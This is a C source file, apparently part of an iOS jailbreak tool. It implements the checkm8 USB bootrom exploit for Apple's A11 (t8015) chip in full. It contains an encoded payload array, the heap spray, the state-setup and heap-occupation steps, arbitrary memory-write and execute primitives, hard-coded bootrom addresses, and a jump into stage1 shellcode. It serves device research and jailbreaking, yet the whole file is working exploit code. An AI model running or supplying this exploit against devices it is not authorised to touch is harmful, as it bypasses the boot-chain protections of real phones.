    0xc3, 0x00, 0x00, 0x54, 0x23, 0x00, 0x40, 0x79, 0x03, 0x00, 0x00, 0x79,
    0x00, 0x08, 0x00, 0x91, 0x21, 0x08, 0x00, 0x91, 0x42, 0x08, 0x00, 0xd1,
    0xc2, 0x00, 0x00, 0xb4, 0x23, 0x00, 0x40, 0x39, 0x03, 0x00, 0x00, 0x39,
    0x00, 0x04, 0x00, 0x91, 0x21, 0x04, 0x00, 0x91, 0x42, 0x04, 0x00, 0xd1,
    0xe0, 0x03, 0x04, 0xaa, 0xc0, 0x03, 0x5f, 0xd6, 0x1f, 0x20, 0x03, 0xd5,
    0x00, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0x63, 0x65, 0x78, 0x65,
    0x63, 0x65, 0x78, 0x65, 0x65, 0x6e, 0x6f, 0x64, 0x65, 0x6e, 0x6f, 0x64,
    0x63, 0x6d, 0x65, 0x6d, 0x63, 0x6d, 0x65, 0x6d, 0x73, 0x6d, 0x65, 0x6d,
    0x73, 0x6d, 0x65, 0x6d, 0xa8, 0xb9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static size_t checkm8_t8015_payload_size = 0xc00;
static unsigned int val = 0;

// checkm8 usb req
__unused static transfer_t usb_req_stall(io_client_t client)
{
    return usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
}

__unused static transfer_t usb_req_leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ, 1);
}

__unused static transfer_t usb_req_no_leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ + 1, 1);
}

__unused static transfer_t leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, 1);
}

__unused static transfer_t no_leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, (3 * EP0_MAX_PACKET_SZ) + 1, 1);
}

__unused static transfer_t usb_req_leak_with_async(io_client_t client,
                                   unsigned char* blank,
                                   int usleep_time,
                                   async_transfer_t transfer)
{
    transfer_t result = async_usb_ctrl_transfer(client, 0x80, 6, 0x304, 0x40a, blank, EP0_MAX_PACKET_SZ, &transfer);
    usleep(usleep_time);
    io_abort_pipe_zero(client);
    usleep(usleep_time);
    while(transfer.ret != kIOReturnAborted)
        CFRunLoopRun();
    
    return result;
}

static void pre_retry(io_client_t client, unsigned int i)
{
    transfer_t result;
    memset(&blank, '\x41', EP0_MAX_PACKET_SZ);
    
    DEBUGLOG("(*) retry: %x", i);
    usleep(10000);
    result = send_data(client, blank, EP0_MAX_PACKET_SZ); // send blank data and redo the request.
    DEBUGLOG("(*) %x", result.ret);
    usleep(10000);
}

static int heap_spray_t8015(io_client_t client)
{
    unsigned int i = 0;
    transfer_t result;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = send_data(client, blank, DFU_MAX_TRANSFER_SZ);
    DEBUGLOG("(1/5) %x", result.ret);
    
    i = 0;
    while(1)
    {
        async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, i);
        
        result = usb_req_leak(client, blank);
        if(result.ret != kIOReturnSuccess)
            break;
        
        i++;
        DEBUGLOG("(*) retry: %x", i);
        
        if(i > MAX_RETRY_STALL)
        {
            ERROR("Failed to stall");
            return -1;
        }
    }
    DEBUGLOG("(2/5) %x, %d", result.ret, i);
    
    for(i=0; i<6; i++)
    {
        result = no_leak(client, blank);
    }
    DEBUGLOG("(3/5) %x", result.ret);
    
    result = usb_req_leak(client, blank);
    DEBUGLOG("(4/5) %x", result.ret);
    
    result = no_leak(client, blank);
    DEBUGLOG("(5/5) %x", result.ret);
    
    return 0;
}

static int set_global_state_t8015(io_client_t client)
{
    transfer_t result;
    UInt32 sent = 0;
    unsigned int i = 0;
    
    
        // A11
    unsigned int value = 0x500;
    
    
    memset(&blank, '\x41', DFU_MAX_TRANSFER_SZ);
    
    i = 0;
    {
        /*
        while(((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0)) >= val) || (sent == 0))
        {
            // check return value is stall or not
            // thanks @0x7ff https://github.com/0x7ff/gaster/blob/7ffffff4b43171f3c862258cb28f57a789a59b8a/gaster.c#L1130
            result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, NULL, 0, 100);
            DEBUGLOG("(0/2) %x", result.ret);
            
            if(result.ret == kIOUSBPipeStalled || result.ret == kUSBHostReturnPipeStalled)
                break;
            
            if(i > 10000)
                return -1;
            i++;
            pre_retry(client, i);
        }
        val += 0x40;
        val -= sent;
         */
        
        while(i < 10000)
        {
            sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0);
            if(sent >= value)
                goto retry;
                        
            val = value;
            val += 0x40;
            val -= sent;
                        
            DEBUGLOG("(1/3) sent: %x, val: %x", (unsigned int)sent, val);
                        
            //result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, NULL, 0, 100);
            result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
            DEBUGLOG("(2/3) %x", result.ret);
                        
            if(result.ret == kIOUSBPipeStalled || result.ret == kUSBHostReturnPipeStalled)
                break;

        retry:
            // retry
            if(i > 10000)
                return -1;
            i++;
            pre_retry(client, i);
        }
    }
    
    result = send_abort(client);
    DEBUGLOG("(3/3) %x", result.ret);
    
    return 0;
}

static int heap_occupation_t8015(io_client_t client)
{
    transfer_t result;
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    {
        result = usb_req_stall(client);
        DEBUGLOG("(1/4) %x", result.ret);
        usleep(10000);
        
        for(int i=0; i<1; i++)
        {
            result = usb_req_leak(client, blank);
        }
        DEBUGLOG("(2/4) %x", result.ret);
        usleep(10000);
        
        uint64_t overwriteBuf[16]; 
        memset(&overwriteBuf, '\x00', sizeof(overwriteBuf));
        
        overwriteBuf[4]  = 0x000000010000a9c4;
        overwriteBuf[5]  = 0x000000018001c020;
        overwriteBuf[12] = 0x000000010000a9c4;
        overwriteBuf[13] = 0x000000018001c020;
        overwriteBuf[14] = 0x0000000000000000;
        overwriteBuf[15] = 0xbeefbeef00000000;
        
        if(val > DFU_MAX_TRANSFER_SZ - sizeof(overwriteBuf))
            return -1;
        
        //int overwrite_push = val;
        int overwrite_push = 0;
        memset(&blank, '\x00', DFU_MAX_TRANSFER_SZ);
        memcpy(blank + overwrite_push, overwriteBuf, sizeof(overwriteBuf));
        overwrite_push += sizeof(overwriteBuf);
        
        
        result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, overwrite_push, 100);
        DEBUGLOG("(3/4) %x, %x", result.ret, overwrite_push);
        
        {
            size_t len = 0;
            size_t size = 0;
            while(len < checkm8_t8015_payload_size) {
                size = ((checkm8_t8015_payload_size - len) > DFU_MAX_TRANSFER_SZ) ? DFU_MAX_TRANSFER_SZ : (checkm8_t8015_payload_size - len);
                result = send_data_with_time(client, (unsigned char*)&checkm8_t8015_payload[len], size, 100);
                len += size;
            }
        }
        DEBUGLOG("(4/4) %x", result.ret);
        usleep(1000);
        
    }
    
    return 0;
}

static int checkm8_write_memory(io_client_t *pclient,
                        uint64_t address, uint64_t size,
                        unsigned char * buf)
{
    if(!*pclient) // check client
    {
        ERROR("Failed to get response from client");
        return -1;
    }
    
    if(!buf)
    {
        ERROR("No buffer data");
        return -1;
    }
    
    if(size == 0)
    {
        ERROR("No buffer size");
        return -1;
    }
    
    if(size > (0x800 - (8*5)))
    {
        ERROR("Data size too large.");
        return -1;
    }
    
    transfer_t result;
    
    io_client_t _client = *pclient;
    static unsigned char data[DFU_MAX_TRANSFER_SZ];
    size_t req_size = 0;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    memset(&data, '\0', DFU_MAX_TRANSFER_SZ);
    
    uint64_t* payload = (uint64_t*)data;
    payload[0] = 0x6d656d636d656d63;
    payload[2] = address; // write addr
    payload[3] = 0x18001C000 + 16 + (3 * 8); // // load_base + 16 + (index * 4)
    payload[4] = size;
    
    memcpy(data + (8*5), buf, size);
    
    req_size = (8*5) + size;
    
    if(req_size > 0x800)
    {
        ERROR("Data size too large.");
        return -1;
    }
    DEBUGLOG("req_size: %zx", req_size);
    
    DEBUGLOG("WRITE_MEMORY: %016llx (len: %llx)", address, size);
    
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, blank, 16, 100);
    DEBUGLOG("STAGE1 SETUP: (1/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, NULL,   0, 100);
    DEBUGLOG("STAGE1 SETUP: (2/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (3/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (4/4) %x", result.ret);
    
    result = send_data_with_time(_client, data, req_size, 100);
    DEBUGLOG("STAGE2 SEND: (1/1) %x", result.ret);
    
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 2, 0xffff, 0x0000, blank, 1, 100);
    DEBUGLOG("STAGE3 EXECUTE: (1/1) %x", result.ret);
    
    usleep(10000);
    if(io_reconnect(pclient, 5, DEVICE_DFU, USB_NO_RESET, false, 10000))
    {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    return 0;
}

static int checkm8_execute(io_client_t *pclient,
                   int res,
                   // TODO
                   uint64_t exec, uint64_t arg1)
{
    if(!*pclient) // check client
    {
        ERROR("Failed to get response from client");
        return -1;
    }
    
    transfer_t result;
    
    io_client_t _client = *pclient;
    static unsigned char data[DFU_MAX_TRANSFER_SZ];
    size_t req_size = 0;
    
    uint64_t* payload = (uint64_t*)data;
    payload[0] = 0x6578656365786563;
    req_size += sizeof(uint64_t);
    
    // exec
    payload[1] = exec;
    req_size += sizeof(uint64_t);
    
    // TODO
    if(arg1)
    {
        payload[2] = arg1;
        req_size += sizeof(uint64_t);
    }
    
    if(req_size > 0x800)
    {
        ERROR("Data size too large.");
        return -1;
    }
    DEBUGLOG("req_size: %zx", req_size);
    
    DEBUGLOG("EXECUTE: %016llx(0x%016llx)", exec, arg1);
    
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, blank, 16, 100);
    DEBUGLOG("STAGE1 SETUP: (1/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, NULL,   0, 100);
    DEBUGLOG("STAGE1 SETUP: (2/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (3/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (4/4) %x", result.ret);
    
    result = send_data_with_time(_client, data, req_size, 100);
    DEBUGLOG("STAGE2 SEND: (1/1) %x", result.ret);
    
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 2, 0xffff, 0x0000, blank, 16, 100);
    DEBUGLOG("STAGE3 EXECUTE: (1/1) %x", result.ret);
    
    if(res)
    {
        usleep(10000);
        if(io_reconnect(pclient, 5, DEVICE_DFU, USB_NO_RESET, false, 10000))
        {
            ERROR("Failed to reconnect to device");
            return -1;
        }
    }
    
    return 0;
}

int checkm8_t8015(io_client_t client, checkra1n_payload_t shellcode)
{
    int STEP2_USB_RESET_FLAGS = USB_NO_RESET;
    int STEP3_USB_RESET_FLAGS = USB_NO_RESET;
    
    {
        // A9X-A11
        STEP2_USB_RESET_FLAGS |= (USB_REENUMERATE);
        STEP3_USB_RESET_FLAGS |= (USB_REENUMERATE);
    }
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    LOG_EXPLOIT_NAME("checkm8");
    
    // transfer test
    usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ);
    usleep(10000);
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client)
    {
        ERROR("Failed to reconnect to device");
        client = NULL;
        return -1;
    }
    
    {
        LOG("running heap_spray");
        if(heap_spray_t8015(client))
        {
            ERROR("Failed to execute heap_spray");
            return -1;
        }
        
        LOG("reconnecting");
        io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
        if(!client)
        {
            ERROR("Failed to reconnect to device");
            return -1;
        }
    }
    
    {
        LOG("running set_global_state()");
        usleep(10000);
        if(set_global_state_t8015(client))
        {
            ERROR("Failed to execute set_global_state");
            return -1;
        }
        
        LOG("reconnecting");
        io_reconnect(&client, 5, DEVICE_DFU, STEP2_USB_RESET_FLAGS, false, 10000);
        if(!client)
        {
            ERROR("Failed to reconnect to device");
            return -1;
        }
    }
    
    LOG("running heap_occupation()");
    usleep(10000);
    if(heap_occupation_t8015(client))
    {
        ERROR("Failed to execute heap_occupation");
        return -1;
    }
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, STEP3_USB_RESET_FLAGS, false, 10000);
    if(!client)
    {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    LOG("checkmate!");
    
    {
        // t8015
        uint64_t HEAP_BASE         = 0x1801E8000;
        uint64_t HEAP_WRITE_OFFSET =      0x5000;
        uint64_t HEAP_WRITE_HASH   = 0x10000D4EC;
        uint64_t HEAP_CHECK_ALL    = 0x10000DB98;
        uint64_t HEAP_STATE        = 0x1800086A0;
        uint64_t NAND_BOOT_JUMP    = 0x10000188C;
        uint64_t BOOTSTRAP_TASK_LR = 0x180015F88;
        uint64_t DFU_BOOL          = 0x1800085B0;
        uint64_t DFU_NOTIFY        = 0x1000098B4;
        uint64_t DFU_STATE         = 0x1800085E0;
        uint64_t TRAMPOLINE        = 0x180018000;
        
        uint64_t block1[8];
        uint64_t block2[8];
        
        memset(&block1, '\0', sizeof(block1));
        block1[3] = HEAP_STATE;
        block1[4] =          2;
        block1[5] =        132;
        block1[6] =        128;
        block1[7] =          0;
        
        memset(&block2, '\0', sizeof(block2));
        block2[3] = HEAP_STATE;
        block2[4] =          2;
        block2[5] =          8;
        block2[6] =        128;
        block2[7] =          0;

#define WRITE_MEMORY(client, addr, size, buf) \
({ \
if(checkm8_write_memory(client, addr, size, buf)) \
{ \
ERROR("get error response"); \
return -1; \
} \
})
        
#define EXECUTE(client, bool, exec, arg1) \
({ \
if(checkm8_execute(client, bool, exec, arg1)) \
{ \
ERROR("get error response"); \
return -1; \
} \
})
        
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET,         sizeof(block1), (unsigned char *)block1);
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET +  0x80, sizeof(block2), (unsigned char *)block2);
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100, sizeof(block2), (unsigned char *)block2);
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180, sizeof(block2), (unsigned char *)block2);
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET        );
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET +  0x80);
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100);
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180);
        EXECUTE(&client, 1, HEAP_CHECK_ALL,  0);
        LOG("Heap repaired");
        
        usleep(1000);
        
        uint32_t branch_insn[1];
        uint64_t ptr[1];
        uint8_t  boolp[1];
        
        // TODO: branch 'TRAMPOLINE' -> 'TRAMPOLINE + 0x400'
        branch_insn[0] = 0x14000100;
        ptr[0]         = NAND_BOOT_JUMP;
        boolp[0]       = 1;
        
        WRITE_MEMORY(&client, TRAMPOLINE,                            4, (unsigned char *)branch_insn);
        WRITE_MEMORY(&client, TRAMPOLINE + 0x400, shellcode.stage1_len, (unsigned char *)shellcode.stage1);
        WRITE_MEMORY(&client, BOOTSTRAP_TASK_LR,                     8, (unsigned char *)ptr);
        WRITE_MEMORY(&client, DFU_BOOL,                              1, (unsigned char *)boolp);
        EXECUTE(&client, 0, DFU_NOTIFY, DFU_STATE);
        
        LOG("Booted?");
    }
    
    return 0;
}

